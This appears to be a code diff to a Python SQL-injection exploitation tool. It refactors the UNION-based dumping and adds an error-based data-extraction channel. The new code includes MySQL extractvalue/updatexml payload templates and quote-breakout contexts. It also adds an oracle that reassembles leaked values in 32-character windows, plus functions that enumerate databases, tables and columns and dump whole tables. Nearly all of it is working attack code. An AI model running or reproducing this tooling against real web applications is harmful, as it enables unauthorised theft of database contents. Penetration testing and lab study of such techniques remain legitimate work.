@@ -740,14 +740,36 @@ def union_value(http, oracle, dbms, ncols, refcol, expr):
     return m.group(1) if m else ""
 
 
-def _union_list(http, oracle, dbms, ncols, refcol, which, db=None, **fmt):
+def _agg_catalog(value_fn, dbms, marks, which, db=None, **fmt):
+    """Read a catalog list as one group_concat'd string through a value channel
+    (UNION or error-based) and split it. The catalog SQL and the quote-free encoding
+    live here so both channels share them."""
     if "t" in fmt:                       # table name goes in as a quote-free literal
         fmt["t"] = _strlit(dbms, fmt["t"])
-    rowsep = _marks_of(oracle).rowsep
     frag = _dequote(dbms, _uscope(dbms, which, db).format(**fmt))   # also the static predicates
     col, _, frm = frag.partition(" FROM ")
-    data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, col, rowsep)} FROM {frm}")
-    return [x for x in data.split(rowsep) if x]
+    data = value_fn(f"SELECT {_uagg(dbms, col, marks.rowsep)} FROM {frm}")
+    return [x for x in data.split(marks.rowsep) if x]
+
+
+def _agg_dump(value_fn, dbms, marks, table, cols, db=None):
+    """Read a whole table as one group_concat'd string through a value channel, then
+    split rows/cols. Shared by the UNION and error-based dumps."""
+    colsep = _strlit(dbms, marks.colsep)
+    parts = []
+    for i, c in enumerate(cols):
+        if i:
+            parts.append(colsep)
+        parts.append(f"cast({c} as varchar(4000))" if dbms in ("mssql", "postgres") else c)
+    row = _ucat(dbms, parts)
+    src = _qualify(dbms, db, table)
+    data = value_fn(f"SELECT {_uagg(dbms, row, marks.rowsep)} FROM {src}")
+    return [r.split(marks.colsep) for r in data.split(marks.rowsep) if r]
+
+
+def _union_list(http, oracle, dbms, ncols, refcol, which, db=None, **fmt):
+    vf = lambda expr: union_value(http, oracle, dbms, ncols, refcol, expr)
+    return _agg_catalog(vf, dbms, _marks_of(oracle), which, db=db, **fmt)
 
 
 def union_databases(http, oracle, dbms, ncols, refcol):
@@ -763,14 +785,132 @@ def union_columns(http, oracle, dbms, ncols, refcol, table, db=None):
 
 
 def union_dump(http, oracle, dbms, ncols, refcol, table, cols, db=None):
-    marks = _marks_of(oracle)
-    colsep = _strlit(dbms, marks.colsep)
-    parts = []
-    for i, c in enumerate(cols):
-        if i:
-            parts.append(colsep)
-        parts.append(f"cast({c} as varchar(4000))" if dbms in ("mssql", "postgres") else c)
-    row = _ucat(dbms, parts)
-    src = _qualify(dbms, db, table)
-    data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, row, marks.rowsep)} FROM {src}")
-    return [r.split(marks.colsep) for r in data.split(marks.rowsep) if r]
+    vf = lambda expr: union_value(http, oracle, dbms, ncols, refcol, expr)
+    return _agg_dump(vf, dbms, _marks_of(oracle), table, cols, db=db)
+
+
+# ============================ error-based =============================
+# When a quote leaks the DBMS error verbatim but nothing else does — no boolean
+# differential, no reflected column for UNION, no time sink — the error itself is the
+# read channel. A function that forces a type/XPATH error embeds a sub-SELECT's value
+# into the error text after a 0x7e (~) marker; we parse it back out. Like UNION this
+# reads whole values (and whole tables, via group_concat) per request, not one bit.
+
+_ERR_MARK = "~"            # the 0x7e byte each payload prefixes the leaked data with
+_ERR_WINDOW = 32          # extractvalue/updatexml truncate around here on real MySQL
+
+# Per-DBMS error functions; {e} is the marker-prefixed expression to leak. Two forms
+# each, so a filtered one has a fallback. MySQL first (what the lab models); the rest
+# are left to fill in later (Postgres CAST(...AS int), MSSQL CONVERT(int,...), Oracle).
+_ERROR_FNS = {
+    "mysql": [
+        "extractvalue(1,concat(0x7e,{e}))",
+        "updatexml(1,concat(0x7e,{e}),1)",
+    ],
+}
+
+# Quote-breakout contexts for the error payload (mirrors _CONTEXTS, but injects an
+# error function instead of a boolean condition). {v}=value, {e}=fn, {cm}=comment.
+_ERROR_CTX = [
+    ("numeric",       "{v} AND {e}{cm}"),
+    ("single-quote",  "{v}' AND {e}{cm}"),
+    ("double-quote",  "{v}\" AND {e}{cm}"),
+    ("paren-single",  "{v}') AND {e}{cm}"),
+]
+
+
+def _error_leak(body):
+    """The data the engine echoed after our ~ marker, or None if the marker isn't
+    there (the channel didn't fire). Apps HTML-escape the value, so the first literal
+    quote/tag after ~ is the delimiter; unescape what sits between."""
+    if not body:
+        return None
+    i = body.find(_ERR_MARK)
+    if i < 0:
+        return None
+    rest = body[i + 1:]
+    end = len(rest)
+    for ch in ("'", '"', "<"):           # the engine wraps the error in quotes/markup
+        j = rest.find(ch)
+        if 0 <= j < end:
+            end = j
+    return _html.unescape(rest[:end])
+
+
+class ErrorOracle:
+    """A string read-channel over the DBMS error message: value(SELECT) -> str.
+
+    Unlike the boolean/time oracles (one bit per request), this lifts a whole value
+    out of a forced error per request. Long values are read in <=32-char windows
+    (extractvalue/updatexml truncate there) and reassembled; a target that doesn't
+    truncate returns the whole value at once, which the same loop handles — a window
+    that comes back short of full ends the read."""
+
+    def __init__(self, http, url, param, value, dbms, context, ctx_tmpl, fn_tmpl, console=None):
+        self.http, self.url, self.param, self.value = http, url, param, value
+        self.dbms, self.context = dbms, context
+        self._ctx, self._fn = ctx_tmpl, fn_tmpl
+        self.console = console
+        self.cache = None                 # parity with the other oracles (unused here)
+        self.marks = _new_marks()
+        self.blocked = 0
+
+    @property
+    def count(self):
+        return self.http.count
+
+    def _payload(self, leak_expr):
+        return self._ctx.format(v=self.value, e=self._fn.format(e=leak_expr), cm=_COMMENT)
+
+    def _read_window(self, expr, off):
+        payload = self._payload(f"substring(({expr}),{off},{_ERR_WINDOW})")
+        if self.console is not None and self.console.verbose >= 2:
+            self.console.trace(f"{self.param}={payload}", level=2)
+        return _error_leak(_inject(self.http, self.url, self.param, payload))
+
+    def read(self, expr) -> str:
+        """The string value of a scalar SQL expression, read through the error channel
+        in <=32-char windows and reassembled. (Named `read`, not `value`, so it doesn't
+        shadow self.value — the parameter's normal value.)"""
+        out, off = "", 1
+        while off <= 1 << 16:
+            chunk = self._read_window(expr, off)
+            if not chunk:                    # channel failed, or the value is exhausted
+                break
+            out += chunk
+            if len(chunk) != _ERR_WINDOW:    # a short window is the last (real engine),
+                break                        # or the whole value at once (non-truncating)
+            off += _ERR_WINDOW
+        return out
+
+
+def error_calibrate(http, url, param, value, dbms=None, console=None):
+    """Find an error-based channel: an error function + quote context whose forced
+    error echoes a planted token. Confirmed with a random number (round-trips on any
+    engine, carries no quotes), so a stray 500 page can't false-positive. The wraith
+    handoff's `dbms` is tried first; otherwise every known engine is."""
+    order = [dbms] if dbms in _ERROR_FNS else list(_ERROR_FNS)
+    token = str(random.randint(10 ** 6, 10 ** 7 - 1))
+    for d in order:
+        for fn in _ERROR_FNS[d]:
+            for ctx_name, ctx_tmpl in _ERROR_CTX:
+                eo = ErrorOracle(http, url, param, value, d, ctx_name, ctx_tmpl, fn, console)
+                if eo.read(f"SELECT {token}") == token:
+                    return eo
+    return None
+
+
+def error_databases(eo):
+    return _agg_catalog(eo.read, eo.dbms, eo.marks, "dbs")
+
+
+def error_tables(eo, db=None):
+    return _agg_catalog(eo.read, eo.dbms, eo.marks, "tables", db=db)
+
+
+def error_columns(eo, table, db=None):
+    return _agg_catalog(eo.read, eo.dbms, eo.marks, "cols", db=db, t=table)
+
+
+def error_dump(eo, table, cols, db=None):
+    return _agg_dump(eo.read, eo.dbms, eo.marks, table, cols, db=db)
